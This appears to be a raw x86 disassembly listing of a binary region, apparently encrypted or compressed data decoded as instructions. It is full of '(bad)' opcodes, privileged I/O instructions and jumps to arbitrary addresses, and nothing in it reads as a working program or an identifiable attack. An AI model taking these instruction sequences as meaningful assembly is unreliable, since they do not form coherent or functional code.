  41a0ee:	mov    al,ds:0x7e9243b
  41a0f3:	mov    edx,0x8c914875
  41a0f8:	gs push es
  41a0fa:	enter  0xeedb,0xe8
  41a0fe:	fld    QWORD PTR [ebx+0x7529017a]
  41a104:	fs inc edx
  41a106:	rcl    DWORD PTR [ebp+0x39],0xf0
  41a10a:	xchg   DWORD PTR [ebp+0x6d],esp
  41a10d:	xor    eax,0x8ba350a2
  41a112:	(bad)  
  41a113:	xchg   BYTE PTR [ebp-0x43],bl
  41a116:	ss (bad) 
  41a118:	arpl   WORD PTR [edx],bp
  41a11a:	outs   dx,DWORD PTR ds:[esi]
  41a11b:	push   ebp
  41a11c:	in     al,dx
  41a11d:	(bad)
  41a121:	mov    edx,0xbe338452
  41a126:	test   DWORD PTR [edx-0x15f6ddc0],esi
  41a12c:	mov    ecx,0x9b05adea
  41a131:	fadd   DWORD PTR [ebx+edi*1]
  41a134:	or     DWORD PTR [esi],esp
  41a136:	jno    0x41a10f
  41a138:	loope  0x41a109
  41a13a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a13b:	clc    
  41a13c:	and    dl,BYTE PTR [edi-0x7e]
  41a13f:	jno    0x41a0fc
  41a141:	aaa    
  41a142:	in     eax,0xc8
  41a144:	inc    edx
  41a145:	or     al,0xca
  41a147:	mov    BYTE PTR [esi],dl
  41a149:	and    BYTE PTR [ebx+0x59a2ea1a],bh
  41a14f:	vcvtsi2ss xmm4,xmm3,DWORD PTR [edx]
  41a153:	xor    eax,edx
  41a155:	sbb    eax,0x841478d8
  41a15a:	cmc    
  41a15b:	hlt    
  41a15c:	mov    ebx,0xaa493ba6
  41a161:	inc    ebx
  41a162:	jb     0x41a1d0
  41a164:	pop    es
  41a165:	mov    ah,0x61
  41a167:	ret    0x7876
  41a16a:	mov    WORD PTR [edx-0x56],cs
  41a16d:	and    al,0x75
  41a16f:	bound  edx,QWORD PTR [ebp+0x4be509f4]
  41a175:	loop   0x41a110
  41a177:	and    ah,BYTE PTR [esi]
  41a179:	test   BYTE PTR [eax+0x10],al
  41a17c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a17d:	in     al,0x8b
  41a17f:	dec    dh
  41a181:	pop    esp
  41a182:	dec    ebp
  41a183:	mov    bh,BYTE PTR [ecx+0x7d]
  41a186:	xchg   edx,eax
  41a187:	pop    ds
  41a188:	rol    BYTE PTR [ebx+0x44701079],1
  41a18e:	loope  0x41a157
  41a190:	sbb    DWORD PTR [eax],eax
	...
  41a1f2:	add    BYTE PTR [eax],al
  41a1f4:	sbb    al,0xc
  41a1f6:	std    
  41a1f7:	sbb    ebp,edi
  41a1f9:	stc    
  41a1fa:	cld    
  41a1fb:	or     eax,0x398d6850
  41a200:	sbb    esp,esi
  41a202:	pusha  
  41a203:	and    eax,0x11526
  41a208:	add    eax,0x1c000001
  41a20d:	popa   
  41a20e:	adc    bl,0xe3
  41a211:	xchg   edx,eax
  41a212:	pop    ebx
  41a213:	fs inc ebp
  41a215:	sbb    ah,0x7e
  41a218:	sub    DWORD PTR [ebp-0x3e],eax
  41a21b:	cmp    eax,0x785e2851
  41a220:	cmp    dh,bl
  41a222:	ins    DWORD PTR es:[edi],dx
  41a223:	mov    ah,0xc3
  41a225:	imul   edx,DWORD PTR ds:0x77114b02,0x8ca5cdb7
  41a22f:	add    BYTE PTR [edx],dh
  41a231:	or     dl,BYTE PTR ds:0xff9f735d
  41a237:	sub    eax,0xe12ad2fd
  41a23c:	hlt    
  41a23d:	ins    BYTE PTR es:[edi],dx
  41a23e:	pop    ss
  41a23f:	push   edi
  41a240:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a241:	mov    ds:0x82f7edf2,eax
  41a246:	je     0x41a248
  41a248:	shl    BYTE PTR [ebx-0x71],cl
  41a24b:	hlt    
  41a24c:	mov    ds:0x42ca1670,al
  41a251:	push   es
  41a252:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a253:	ins    BYTE PTR es:[edi],dx
  41a254:	or     eax,0x1076f84a
  41a259:	xchg   ecx,eax
  41a25a:	sub    al,0x6b
  41a25c:	mov    WORD PTR [edi+esi*2-0x6fd4e3c8],ds
  41a263:	retf   
  41a264:	loope  0x41a23c
  41a266:	inc    eax
  41a267:	mov    bh,0xdc
  41a269:	xchg   ah,bh
  41a26b:	rep ins DWORD PTR es:[edi],dx
  41a26d:	(bad)  
  41a26e:	retf   
  41a26f:	jmp    0x41a2af
  41a271:	or     dl,BYTE PTR ds:[ecx-0x21ff5d0e]
  41a278:	shl    DWORD PTR [eax+0x43eb6f1d],1
  41a27e:	dec    esi
  41a27f:	ret    
  41a280:	in     al,dx
  41a281:	rol    BYTE PTR fs:[esi-0x61288d43],cl
  41a288:	add    al,0x3a
  41a28a:	dec    esp
  41a28b:	lods   eax,DWORD PTR ds:[esi]
  41a28c:	mov    esi,edx
  41a28e:	ins    BYTE PTR es:[edi],dx
  41a28f:	or     BYTE PTR [esi+eiz*2],dl
  41a292:	xchg   edx,eax
  41a293:	inc    esi
  41a294:	sub    DWORD PTR [edx-0x18b33aca],eax
  41a29a:	push   esp
  41a29b:	js     0x41a28c
  41a29d:	fisttp DWORD PTR [edx+ecx*1-0x7ff47ba4]
  41a2a4:	xor    DWORD PTR [eax],0x4b2fb408
  41a2aa:	rol    DWORD PTR [ecx+0x38],0xf1
  41a2ae:	scas   al,BYTE PTR es:[edi]
  41a2af:	loopne 0x41a2ef
  41a2b1:	mov    DWORD PTR [ebx-0x3],edx
  41a2b4:	push   es
  41a2b5:	sub    dh,BYTE PTR [edi]
  41a2b7:	mov    esi,0xeb9f00e7
  41a2bc:	mov    ebp,DWORD PTR [esi+0x20a64d0a]
  41a2c2:	mov    bl,0xcc
  41a2c4:	push   esi
  41a2c5:	cmp    edx,DWORD PTR [esi+0xa44cf9c]
  41a2cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a2cc:	mov    eax,ds:0x975b237c
  41a2d1:	pop    ds
  41a2d2:	and    BYTE PTR [ecx],bl
  41a2d4:	jae    0x41a273
  41a2d6:	xor    DWORD PTR cs:0x10995d79,0x53df7159
  41a2e1:	xchg   ebx,eax
  41a2e2:	xor    esp,DWORD PTR [esi+ecx*8]
  41a2e5:	cld    
  41a2e6:	in     eax,dx
  41a2e7:	mov    ah,0xaf
  41a2e9:	pusha  
  41a2ea:	enter  0x53d8,0x8
  41a2ee:	jnp    0x41a2e9
  41a2f0:	(bad)  
  41a2f1:	inc    BYTE PTR [esi+0x2]
  41a2f4:	ds adc dl,dh
  41a2f7:	cmp    DWORD PTR [ecx-0x631d1bec],edi
  41a2fd:	or     al,0x14
  41a2ff:	hlt    
  41a300:	jge    0x41a36c
  41a302:	push   cs
  41a303:	mov    ebx,0xde81e38
  41a308:	xchg   esi,eax
  41a309:	pop    edx
  41a30a:	mov    ah,0x77
  41a30c:	in     eax,dx
  41a30d:	mov    fs,ebx
  41a30f:	inc    DWORD PTR fs:[eax]
	...
  41a372:	add    BYTE PTR [eax],al
  41a374:	neg    DWORD PTR [eax-0x58]
  41a377:	adc    ebp,DWORD PTR [edi+0x15fcfff3]
  41a37d:	pop    esp
  41a37e:	xchg   ebp,eax
  41a37f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a380:	xchg   esp,eax
  41a381:	jae    0x41a3bd
  41a383:	jne    0x41a3b0
  41a385:	push   ss
  41a386:	add    DWORD PTR [eax],eax
  41a388:	add    eax,0xb4000001
  41a38d:	adc    ch,bl
  41a38f:	maxps  xmm6,XMMWORD PTR fs:[esi]
  41a393:	sbb    DWORD PTR [edx+ebx*2],eax
  41a396:	mov    bl,0x3f
  41a398:	(bad)  
  41a399:	adc    BYTE PTR [eax+0x1b93eab4],0xfb
  41a3a0:	push   0x53
  41a3a2:	je     0x41a40c
  41a3a4:	je     0x41a3b4
  41a3a6:	mul    esi
  41a3a8:	sbb    edi,edx
  41a3aa:	mov    ds:0xc7681c70,eax
  41a3af:	mov    ebp,0xc9d910d9
  41a3b4:	cld    
  41a3b5:	sub    BYTE PTR [ebx],bl
  41a3b7:	sbb    eax,0xeb6e6f0e
  41a3bc:	out    dx,al
  41a3bd:	add    BYTE PTR [ebp+0x78b598ed],dl
  41a3c3:	dec    edi
  41a3c4:	add    al,0x47
  41a3c6:	inc    eax
  41a3c7:	jno    0x41a37c
  41a3c9:	pop    ecx
  41a3ca:	mov    eax,0xd1c852b3
  41a3cf:	xor    al,0xcb
  41a3d1:	sub    esi,esp
  41a3d3:	mov    ch,0xdd
  41a3d5:	hlt    
  41a3d6:	push   ecx
  41a3d7:	xlat   BYTE PTR cs:[ebx]
  41a3d9:	rcl    BYTE PTR ds:[eax],cl
  41a3dc:	in     al,dx
  41a3dd:	clc    
  41a3de:	mov    bh,BYTE PTR [edx+0x49]
  41a3e1:	adc    dl,BYTE PTR [edi+0xf]
  41a3e4:	loop   0x41a419
  41a3e6:	aad    0xa8
  41a3e8:	fwait
  41a3e9:	ss mul edx
  41a3ec:	in     eax,0x83
  41a3ee:	xchg   BYTE PTR es:0xb3e76524,ch
  41a3f5:	ds in  al,0x78
  41a3f8:	add    DWORD PTR [esi-0x1c],0xcf557742
  41a3ff:	into   
  41a400:	ror    BYTE PTR [ebx+0x31],1
  41a403:	xor    esi,DWORD PTR [ebp+0x5370fd3c]
  41a409:	cs pop bx
  41a40c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a40d:	push   0x6734480c
  41a412:	iret   
  41a413:	jno    0x41a3a8
  41a415:	stos   BYTE PTR es:[edi],al
  41a416:	jecxz  0x41a3d7
  41a418:	cmp    BYTE PTR [ecx+0x12fc577e],ah
  41a41e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a41f:	push   DWORD PTR [ebp+0x131580c7]
  41a425:	arpl   WORD PTR [edi-0x4c],si
  41a428:	add    DWORD PTR [ebx],esp
  41a42a:	jl     0x41a42d
  41a42c:	je     0x41a44b
  41a42e:	add    DWORD PTR [eax+0x70],esi
  41a431:	outs   dx,BYTE PTR ds:[esi]
  41a432:	mov    al,0x4
  41a434:	dec    ebp
  41a435:	xor    dl,BYTE PTR [ebx-0x7c]
  41a438:	int3   
  41a439:	jae    0x41a485
  41a43b:	adc    eax,0x83f6c434
  41a440:	xchg   ebx,eax
  41a441:	scas   eax,DWORD PTR es:[edi]
  41a442:	fldenv [eax*8-0x565b863c]
  41a449:	int3   
  41a44a:	aaa    
  41a44b:	gs retf 0x65cb
  41a44f:	stos   BYTE PTR es:[edi],al
  41a450:	cli    
  41a451:	add    ch,dh
  41a453:	mov    ecx,0x3f28f798
  41a458:	mov    ch,0xf1
  41a45a:	and    eax,0x7d65c88b
  41a45f:	dec    edi
  41a460:	or     ah,BYTE PTR [edi-0x33]
  41a463:	xchg   DWORD PTR [ebx+0x7d],esi
  41a466:	test   DWORD PTR [ebx],ebx
  41a468:	imul   edi,DWORD PTR [edx+0x5edfe3ff],0x22
  41a46f:	ror    eax,1
  41a471:	loope  0x41a47d
  41a473:	xor    ax,cx
  41a476:	push   ds
  41a477:	xor    BYTE PTR [eax],al
  41a479:	sub    eax,eax
  41a47b:	xlat   BYTE PTR ds:[ebx]
  41a47c:	inc    eax
  41a47d:	mov    bl,dh
  41a47f:	xchg   edx,eax
  41a480:	js     0x41a46e
  41a482:	btr    DWORD PTR [edx],ecx
  41a485:	mov    edx,0x47289971
  41a48a:	aam    0x9e
  41a48c:	sub    cl,BYTE PTR [ebx+ebx*1]
  41a48f:	sbb    edi,esp
	...
  41a4f1:	add    BYTE PTR [eax],al
  41a4f3:	add    BYTE PTR [edi-0xf0307e],bh
  41a4f9:	dec    edi
  41a4fa:	push   DWORD PTR [edx+0x5f4d0d09]
  41a500:	adc    al,0xf5
  41a502:	xor    DWORD PTR [edx],esp
  41a504:	xor    BYTE PTR [edi],dl
  41a506:	add    DWORD PTR [eax],eax
  41a508:	add    eax,0x61000001
  41a50d:	popf   
  41a50e:	ror    edi,0xf7
  41a511:	cld    
  41a512:	popa   
  41a513:	cmp    bl,BYTE PTR [ebp+esi*4+0x14]
  41a517:	pop    esp
  41a518:	icebp  
  41a519:	push   ebp
  41a51a:	test   al,0xac
  41a51c:	mov    bh,0xc2
  41a51e:	scas   eax,DWORD PTR es:[edi]
  41a51f:	jbe    0x41a543
  41a521:	mov    eax,ds:0xdf335d25
  41a526:	pop    edx
  41a527:	sti    
  41a528:	(bad)  
  41a529:	adc    edx,DWORD PTR ds:0xf47727bd
  41a52f:	mov    ebx,0xac2e1e3b
  41a534:	loope  0x41a4e6
  41a536:	push   es
  41a537:	(bad)  
  41a538:	adc    BYTE PTR [esi+0xb],bl
  41a53b:	outs   dx,BYTE PTR ds:[esi]
  41a53c:	sbb    cl,BYTE PTR [ecx+0x60e940f3]
  41a542:	or     al,BYTE PTR [edx+esi*8-0x42]
  41a546:	jp     0x41a4e8
  41a548:	mov    edx,0x5026518c
  41a54d:	mov    esi,0x4a5f6a17
  41a552:	iret   
  41a553:	daa    
  41a554:	dec    ecx
  41a555:	xchg   ecx,eax
  41a556:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a557:	push   cs
  41a558:	pop    edi
  41a559:	mov    ecx,0x3d0f2c1f
  41a55e:	xchg   ecx,eax
  41a55f:	jmp    0x5912b436
  41a564:	(bad)  
  41a565:	xchg   edx,eax
  41a566:	sub    ecx,DWORD PTR [edi-0x3f4e6e55]
  41a56c:	and    eax,0x369043c5
  41a571:	popa   
  41a572:	inc    ebp
  41a573:	lahf   
  41a574:	inc    esp
  41a575:	xchg   DWORD PTR [edi],esi
  41a577:	jno    0x41a5d2
  41a579:	pop    ds
  41a57a:	and    al,0xa9
  41a57c:	push   edi
  41a57d:	call   0x9d72:0xa769fe06
  41a584:	sbb    BYTE PTR [ebp+0x61],0x70
  41a588:	sar    BYTE PTR [ebx-0x72f4bfbd],1
  41a58e:	mov    bh,0xc8
  41a590:	jle    0x41a54a
  41a592:	inc    edx
  41a593:	mov    dh,0x56
  41a595:	and    BYTE PTR [ebx+0x50],dl
  41a598:	inc    BYTE PTR [edx-0x46]
  41a59b:	ins    DWORD PTR es:[edi],dx
  41a59c:	push   ss
  41a59d:	dec    ebx
  41a59e:	mov    BYTE PTR [esi-0x2e],dh
  41a5a1:	jns    0x41a5d3
  41a5a3:	sbb    ebp,DWORD PTR [esi-0x441e4289]
  41a5a9:	jecxz  0x41a545
  41a5ab:	mov    eax,0xeb9ba929
  41a5b0:	sub    dh,BYTE PTR [eax+0x538c06c8]
  41a5b6:	sbb    eax,0x1c71d8b7
  41a5bb:	jmp    WORD PTR [ebp-0x13d0fba5]
  41a5c2:	nop
  41a5c3:	cli    
  41a5c4:	xchg   BYTE PTR [esi],ah
  41a5c6:	das    
  41a5c7:	jmp    0x7199:0xc575f2e
  41a5ce:	mov    eax,DWORD PTR [ebx+0x46]
  41a5d1:	cwde   
  41a5d2:	mov    esi,0x7b67563f
  41a5d7:	repnz mov ecx,0xe8360ebe
  41a5dd:	mov    al,ds:0xf8a251b5
  41a5e2:	adc    al,0xc2
  41a5e4:	ret    0x83f5
  41a5e7:	(bad)  
  41a5e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a5e9:	out    0x71,al
  41a5eb:	stos   BYTE PTR es:[edi],al
  41a5ec:	and    BYTE PTR [eax],0x6a
  41a5ef:	inc    ebx
  41a5f0:	lods   eax,DWORD PTR ds:[esi]
  41a5f1:	dec    edx
  41a5f2:	sub    eax,ebx
  41a5f4:	inc    ecx
  41a5f5:	sbb    al,0xa
  41a5f7:	ins    BYTE PTR es:[edi],dx
  41a5f8:	jg     0x41a647
  41a5fa:	daa    
  41a5fb:	ret    
  41a5fc:	pop    ecx
  41a5fd:	push   ecx
  41a5fe:	out    dx,al
  41a5ff:	cmp    eax,0x203b7b4f
  41a604:	dec    edx
  41a605:	push   edi
  41a606:	and    BYTE PTR ds:0x6326d3dd,dl
  41a60c:	mov    bh,0x21
  41a60e:	inc    edi
  41a60f:	sub    DWORD PTR [ecx+0x0],esp
	...
  41a672:	add    BYTE PTR [eax],al
  41a674:	pop    esp
  41a675:	sub    al,BYTE PTR [ecx]
  41a677:	inc    ecx
  41a678:	ja     0x41a6e5
  41a67a:	pop    esp
  41a67b:	aas    
  41a67c:	dec    ecx
  41a67d:	push   0x6953a625
  41a682:	push   eax
  41a683:	outs   dx,DWORD PTR ds:[esi]
  41a684:	xor    eax,0x5000118
  41a689:	add    DWORD PTR [eax],eax
  41a68b:	add    al,dl
  41a68d:	cs mov bh,0xd4
  41a690:	jbe    0x41a698
  41a692:	and    edi,ecx
  41a694:	fidiv  WORD PTR [ebx-0x34]
  41a697:	sbb    bh,bl
  41a699:	imul   ecx,DWORD PTR [edi],0xe72daa85
  41a69f:	fdivr  DWORD PTR [edx+0x4856d209]
  41a6a5:	adc    BYTE PTR [edx+0x74],al
  41a6a8:	jle    0x41a64d
  41a6aa:	jo     0x41a6ae
  41a6ac:	xchg   ebx,eax
  41a6ad:	inc    eax
  41a6ae:	cld    
  41a6af:	in     eax,dx
  41a6b0:	not    DWORD PTR [eax]
  41a6b2:	fwait
  41a6b3:	mov    ch,0xab
  41a6b5:	mov    eax,0xc127b4d1
  41a6ba:	arpl   WORD PTR [ebx+edx*4+0x4ef27eb1],bx
  41a6c1:	jmp    DWORD PTR [esi]
  41a6c3:	mov    BYTE PTR [ebp+0x1a88fa25],bl
  41a6c9:	test   BYTE PTR [esi],al
  41a6cb:	xor    DWORD PTR [esi-0x2db76833],0x5a063087
  41a6d5:	sbb    BYTE PTR [eax-0x2],ch
  41a6d8:	popa   
  41a6d9:	mov    dh,BYTE PTR [edi+0x41e97e6a]
  41a6df:	jmp    0x5009:0xaae38b58
  41a6e6:	sub    eax,0x18c3f575
  41a6eb:	loopne 0x41a768
  41a6ed:	call   0xf9ea:0x1ae237ae
  41a6f4:	mov    ch,0x3a
  41a6f6:	jne    0x41a6b3
  41a6f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a6f9:	add    BYTE PTR [eax-0x4e93a9ba],cl
  41a6ff:	loop   0x41a70b
  41a701:	pop    edx
  41a702:	push   ebp
  41a703:	and    al,0x24
  41a705:	jb     0x41a75c
  41a707:	inc    ecx
  41a708:	aam    0xee
  41a70a:	or     BYTE PTR [edi],ah
  41a70c:	ds push edx
  41a70e:	fs cs jg 0x41a720
  41a712:	add    BYTE PTR [eax+0x7],ch
  41a715:	mov    ds:0xad811d26,al
  41a71a:	add    ah,bl
  41a71c:	addr16 data16 in al,0x8c
  41a720:	dec    eax
  41a721:	sbb    ebp,edi
  41a723:	test   al,0xb9
  41a725:	xchg   edi,eax
  41a726:	loope  0x41a746
  41a728:	dec    esi
  41a729:	mov    ebx,0x9a41ed49
  41a72e:	pop    edi
  41a72f:	mov    al,0x7e
  41a731:	sub    eax,0x38b02517
  41a736:	cdq    
  41a737:	in     eax,0x9a
  41a739:	ss adc eax,0x2968ffc7
  41a73f:	sub    BYTE PTR [eax+0x5c45ef7a],cl
  41a745:	scas   eax,DWORD PTR es:[edi]
  41a746:	or     eax,0xa51c0fcf
  41a74b:	shl    DWORD PTR [ecx],0xf3
  41a74e:	push   ebx
  41a74f:	adc    al,0x6f
  41a751:	aaa    
  41a752:	sub    eax,0x15172148
  41a757:	jg     0x41a7c4
  41a759:	add    esp,DWORD PTR [edi]
  41a75b:	sti    
  41a75c:	aad    0xc
  41a75e:	shl    dl,0xdc
  41a761:	push   eax
  41a762:	jecxz  0x41a744
  41a764:	lahf   
  41a765:	fwait
  41a766:	hlt    
  41a767:	inc    ebp
  41a768:	add    ecx,ebx
  41a76a:	sbb    eax,0x90e7846d
  41a76f:	lds    ecx,FWORD PTR [ebp-0x80]
  41a772:	(bad)  
  41a773:	mov    ds:0xc7188adb,al
  41a778:	jp     0x41a7ba
  41a77a:	mov    edx,0xc21395e2
  41a77f:	push   ebp
  41a780:	ret    0xaa1b
  41a783:	xchg   ecx,eax
  41a784:	or     ch,BYTE PTR [ecx-0x1d]
  41a787:	xlat   BYTE PTR ds:[ebx]
  41a788:	cld    
  41a789:	int3   
  41a78a:	xchg   esp,eax
  41a78b:	xor    ebx,DWORD PTR [esi]
  41a78d:	xor    BYTE PTR [esi-0x4b],0x4d
	...
  41a7f1:	add    BYTE PTR [eax],al
  41a7f3:	add    bl,dh
  41a7f5:	xchg   edi,eax
  41a7f6:	jae    0x41a77f
  41a7f8:	ja     0x41a7e1
  41a7fa:	div    edi
  41a7fc:	mov    ds:0xff5327ca,al
  41a801:	cld    
  41a802:	inc    ecx
  41a803:	and    eax,0x1193a
  41a808:	add    eax,0x6a000001
  41a80d:	loopne 0x41a80a
  41a80f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a810:	jns    0x41a857
  41a812:	(bad)  
  41a813:	out    0x3c,al
  41a815:	call   FWORD PTR [ecx+0x3d]
  41a818:	(bad)  
  41a819:	mov    ah,0x2b
  41a81b:	mov    ds:0x397cad4b,al
  41a820:	push   eax
  41a821:	push   ebx
  41a822:	mov    WORD PTR [ecx-0x4e],?
  41a825:	pop    ss
  41a826:	mov    dh,0x50
  41a828:	cmc    
  41a829:	outs   dx,DWORD PTR ds:[esi]
  41a82a:	mov    al,ds:0xf48eb09d
  41a82f:	cmc    
  41a830:	test   DWORD PTR [ecx+0x422fd70c],ebx
  41a836:	mov    cl,0x9c
  41a838:	ret    0xa5a3
  41a83b:	loope  0x41a896
  41a83d:	addr16 (bad) 
  41a83f:	hlt    
  41a840:	dec    esi
  41a841:	or     edi,DWORD PTR [edx+edx*8+0xf]
  41a845:	inc    edx
  41a846:	mov    ds:0xbf6e6f1f,eax
  41a84b:	sar    ah,cl
  41a84d:	and    al,0xa4
  41a84f:	sub    DWORD PTR [ebp+0x20],esi
  41a852:	fidiv  DWORD PTR [eax+0x77]
  41a855:	cmp    al,cl
  41a857:	mov    edi,0xb370c3cb
  41a85c:	xchg   esi,eax
  41a85d:	push   eax
  41a85e:	mov    ecx,0x3dd4fb0d
  41a863:	out    dx,al
  41a864:	mov    edx,0x6524841c
  41a869:	xchg   ebx,eax
  41a86a:	mov    bh,0xfc
  41a86c:	pop    ebp
  41a86d:	les    edx,FWORD PTR [esi+0x12a68871]
  41a873:	adc    ch,BYTE PTR [ecx+ebx*1-0x7ce49bd]
  41a87a:	mov    ds,ecx
  41a87c:	adc    bh,bl
  41a87e:	mov    DWORD PTR [eax-0x28],0x4fde9be4
  41a885:	sbb    BYTE PTR [esi+0x69c11152],0xff
  41a88c:	sbb    BYTE PTR [eax-0xd],0x2f
  41a890:	xor    BYTE PTR [ecx],dh
  41a892:	into   
  41a893:	mov    edi,0x3fedd89b
  41a898:	xchg   ecx,eax
  41a899:	push   0xffffffe6
  41a89b:	int3   
  41a89c:	ret    
  41a89d:	mov    esp,0x12a6a85e
  41a8a2:	sahf   
  41a8a3:	ret    0xcacc
  41a8a6:	add    DWORD PTR [ecx-0x71],esi
  41a8a9:	dec    ebp
  41a8aa:	xor    al,0xee
  41a8ac:	jge    0x41a89f
  41a8ae:	dec    ecx
  41a8af:	lods   al,BYTE PTR ds:[esi]
  41a8b0:	ds sub ebx,DWORD PTR cs:[edx-0x79]
  41a8b5:	in     al,0xcb
  41a8b7:	call   0x71e2862a
  41a8bc:	les    ecx,FWORD PTR [eax+0x4d]
  41a8bf:	pop    es
  41a8c0:	jns    0x41a845
  41a8c2:	xor    cl,bl
  41a8c4:	into   
  41a8c5:	ror    ebx,1
  41a8c7:	(bad)  ds:0x4b2a18f
  41a8cd:	mov    ds:0x8d72b0cd,al
  41a8d2:	cmp    DWORD PTR [esi-0x1e],edx
  41a8d5:	aam    0x24
  41a8d7:	mov    eax,ds:0x7ddd768a
  41a8dc:	mov    ecx,0xad39e4f8
  41a8e1:	sbb    al,0x69
  41a8e3:	dec    eax
  41a8e4:	les    edi,FWORD PTR [ebp*8-0x62942d9e]
  41a8eb:	shl    DWORD PTR [edx],1
  41a8ed:	mov    dl,0xf0
  41a8ef:	xor    bl,bh
  41a8f1:	jo     0x41a91f
  41a8f3:	mov    cl,0xa9
  41a8f5:	fsub   DWORD PTR [ebp+0x345be8f2]
  41a8fb:	sub    cl,dl
  41a8fd:	int3   
  41a8fe:	sbb    edx,ebx
  41a900:	dec    eax
  41a901:	call   0xbf8041bc
  41a906:	sub    eax,0x22e682f4
  41a90b:	test   al,0x75
  41a90d:	push   0xd
  41a90f:	call   0x0:0xde
	...
  41a972:	add    BYTE PTR [eax],al
  41a974:	xor    eax,0xcf4a867e
  41a979:	cli    
  41a97a:	std    
  41a97b:	jg     0x41a9cb
  41a97d:	push   edx
  41a97e:	pushf  
  41a97f:	dec    esp
  41a980:	mov    edx,0x3f11025d
  41a985:	sbb    al,BYTE PTR [ecx]
  41a987:	add    BYTE PTR ds:0x94000001,al
  41a98d:	sbb    DWORD PTR [ecx+0x272d7da8],0x2d31b3b0
  41a997:	cmc    
  41a998:	test   al,0xff
  41a99a:	pop    ebp
  41a99b:	lahf   
  41a99c:	jge    0x41a9e9
  41a99e:	lods   al,BYTE PTR ds:[esi]
  41a99f:	jo     0x41a9a8
  41a9a1:	lds    eax,FWORD PTR [edx-0x6d]
  41a9a4:	retf   
  41a9a5:	sahf   
  41a9a6:	out    0xf,eax
  41a9a8:	dec    ebx
  41a9a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a9aa:	xchg   edi,eax
  41a9ab:	ins    BYTE PTR es:[edi],dx
  41a9ac:	sbb    dh,cl
  41a9ae:	mov    ah,0x4d
  41a9b0:	push   eax
  41a9b1:	rcl    ebp,0x78
  41a9b4:	pushf  
  41a9b5:	jge    0x41a999
  41a9b7:	push   edi
  41a9b8:	mov    esp,0xd5f86805
  41a9bd:	push   edx
  41a9be:	ficom  WORD PTR [ecx-0x79]
  41a9c1:	fmul   QWORD PTR [ebx+0x2e]
  41a9c4:	push   ecx
  41a9c5:	xor    DWORD PTR [edx-0x799733f],ebx
  41a9cb:	lds    ebp,FWORD PTR [edx-0x1]
  41a9ce:	sbb    eax,0xcb2c00f3
  41a9d3:	daa    
  41a9d4:	mov    esi,0x642cdb91
  41a9d9:	std    
  41a9da:	xor    dl,0x7a
  41a9dd:	sub    edi,DWORD PTR [eax-0x69e6a728]
  41a9e3:	xchg   edi,eax
  41a9e4:	lods   al,BYTE PTR ds:[esi]
  41a9e5:	jl     0x41aa02
  41a9e7:	es and al,0x43
  41a9ea:	ja     0x41a9bf
  41a9ec:	mov    dl,0xcc
  41a9ee:	dec    ebp
  41a9ef:	jl     0x41a9fe
  41a9f1:	cmc    
  41a9f2:	cli    
  41a9f3:	sbb    eax,DWORD PTR [ebx+0x4a]
  41a9f6:	pop    eax
  41a9f7:	xchg   ecx,eax
  41a9f8:	mov    dl,0x93
  41a9fa:	(bad)  
  41a9fb:	mov    ebx,0x3ba6ce26
  41aa00:	mov    WORD PTR [esi+0x65e19127],gs
  41aa06:	stos   DWORD PTR es:[edi],eax
  41aa07:	(bad)  
  41aa08:	call   0x961dc569
  41aa0d:	cmp    al,0xb9
  41aa0f:	leave  
  41aa10:	jecxz  0x41aa13
  41aa12:	mov    BYTE PTR [edi+0xd],al
  41aa15:	add    eax,0x5a3fbe2e
  41aa1a:	aas    
  41aa1b:	and    ebp,DWORD PTR [eax+0x56345e93]
  41aa21:	js     0x41aa2d
  41aa23:	fst    DWORD PTR [esi-0x4f]
  41aa26:	inc    ebp
  41aa27:	jne    0x41aa2c
  41aa29:	inc    esi
  41aa2a:	adc    edx,0x2e19ee38
  41aa30:	dec    ebp
  41aa31:	imul   esp,edx,0x4dc8731
  41aa37:	popf   
  41aa38:	and    DWORD PTR ss:[esi+ebx*4+0x15],eax
  41aa3d:	mov    esi,0x1141c335
  41aa42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa43:	dec    ecx
  41aa44:	push   cs
  41aa45:	es mov ch,0x6
  41aa48:	mov    bl,0x9a
  41aa4a:	popa   
  41aa4b:	loop   0x41aa3c
  41aa4d:	add    al,dl
  41aa4f:	push   ebp
  41aa50:	mov    ecx,DWORD PTR [edi]
  41aa52:	fidiv  DWORD PTR [ecx+0x38c36439]
  41aa58:	mov    cl,0xa1
  41aa5a:	sahf   
  41aa5b:	(bad)  
  41aa5c:	jo     0x41aa58
  41aa5e:	addr16 inc ebx
  41aa60:	test   BYTE PTR [esi],dl
  41aa62:	dec    edx
  41aa63:	push   ebp
  41aa64:	jg     0x41aac1
  41aa66:	pop    es
  41aa67:	mov    WORD PTR [edx-0x76a5137a],ss
  41aa6d:	in     eax,0x8e
  41aa6f:	push   ds
  41aa70:	push   esp
  41aa71:	sbb    eax,0xca5885c1
  41aa76:	imul   ebx,DWORD PTR [ecx],0x59
  41aa79:	jg     0x41aac1
  41aa7b:	inc    ecx
  41aa7c:	std    
  41aa7d:	jae    0x41aad8
  41aa7f:	dec    esi
  41aa80:	mov    ebx,0xc1e9efa2
  41aa85:	xchg   DWORD PTR [ecx+ebp*4],esp
  41aa88:	stos   DWORD PTR es:[edi],eax
  41aa89:	adc    eax,0x4b175353
  41aa8e:	lods   eax,DWORD PTR ds:[esi]
  41aa8f:	sbb    edx,esp
	...
  41aaf1:	add    BYTE PTR [eax],al
  41aaf3:	add    bh,dh
  41aaf5:	add    esp,ebx
  41aaf7:	mov    ah,0xfe
  41aaf9:	std    
  41aafa:	inc    DWORD PTR [ebx+0x5f]
  41aafd:	sbb    BYTE PTR [esi+0x43],ah
  41ab00:	(bad)  
  41ab01:	lea    ebx,[eax+0x11b4489]
  41ab07:	add    BYTE PTR ds:0x9c000001,al
